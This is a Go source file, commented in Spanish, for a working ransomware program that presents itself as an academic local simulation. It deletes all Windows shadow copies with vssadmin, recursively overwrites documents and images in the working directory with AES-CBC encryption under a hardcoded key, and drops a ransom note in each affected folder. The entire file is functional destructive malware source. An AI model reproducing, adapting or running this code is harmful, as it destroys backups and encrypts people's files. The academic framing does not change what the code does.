package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// Clave de cifrado estática local (exactamente 16 bytes para AES-128)
var hardcodedKey = []byte("ByChatGPT1234567")

// Función para listar y eliminar copias shadow
func manageShadowCopies() {
	listCmd := exec.Command("vssadmin", "list", "shadows")
	listCmd.Stdout = os.Stdout
	listCmd.Stderr = os.Stderr
	_ = listCmd.Run()

	deleteCmd := exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet")
	deleteCmd.Stdout = os.Stdout
	deleteCmd.Stderr = os.Stderr
	_ = deleteCmd.Run()
}

// Función para rellenar el texto plano según el estándar PKCS#7
func PKCS7Padding(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padText...)
}

// Función para cifrar un archivo individual con AES-CBC
func encryptFile(filePath string, key []byte) error {
	plaintext, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	mode := cipher.NewCBCEncrypter(block, iv)
	plaintext = PKCS7Padding(plaintext, aes.BlockSize)

	ciphertext := make([]byte, len(plaintext))
	mode.CryptBlocks(ciphertext, plaintext)

	ciphertext = append(iv, ciphertext...)
	if err := os.WriteFile(filePath, ciphertext, 0644); err != nil {
		return err
	}

	return nil
}

// Crear nota de rescate (Funcionalidad extra)
func createRansomNote(dirPath string) {
	notePath := filepath.Join(dirPath, "README_DECRYPT.txt")
	content := []byte("¡Tus archivos han sido cifrados en esta simulación académica local!\n" +
		"Para recuperarlos, utiliza la vacuna oficial de la práctica.\n")
	_ = os.WriteFile(notePath, content, 0644)
}

func isCriticalPath(path string) bool {
	lowerPath := strings.ToLower(path)
	return strings.Contains(lowerPath, `c:\windows`) ||
		strings.Contains(lowerPath, `c:\program files`) ||
		strings.Contains(lowerPath, `c:\program files (x86)`)
}

// Recorrer directorios, cifrar y dejar notas de rescate
func encryptFiles(rootDir string, extensions []string, key []byte) error {
	directoriesAffected := make(map[string]bool)

	err := filepath.Walk(rootDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if isCriticalPath(path) {
			if info.IsDir() {
				return filepath.SkipDir
			}
			return nil
		}

		if info.IsDir() {
			return nil
		}

		for _, ext := range extensions {
			if strings.HasSuffix(strings.ToLower(path), strings.ToLower(ext)) {
				fmt.Println("Cifrando:", path)
				if encErr := encryptFile(path, key); encErr != nil {
					return encErr
				}
				directoriesAffected[filepath.Dir(path)] = true
				break
			}
		}
		return nil
	})

	if err != nil {
		return err
	}

	for dir := range directoriesAffected {
		createRansomNote(dir)
	}

	return nil
}

func main() {
	manageShadowCopies()

	extensions := []string{".jpg", ".docx", ".xlsx", ".pptx", ".pdf", ".png"}

	rootDir, err := os.Getwd()
	if err != nil {
		panic(err)
	}

	fmt.Println("Iniciando proceso de cifrado local en:", rootDir)

	if err := encryptFiles(rootDir, extensions, hardcodedKey); err != nil {
		panic(err)
	}

	fmt.Println("Cifrado completado y notas de rescate generadas.")
}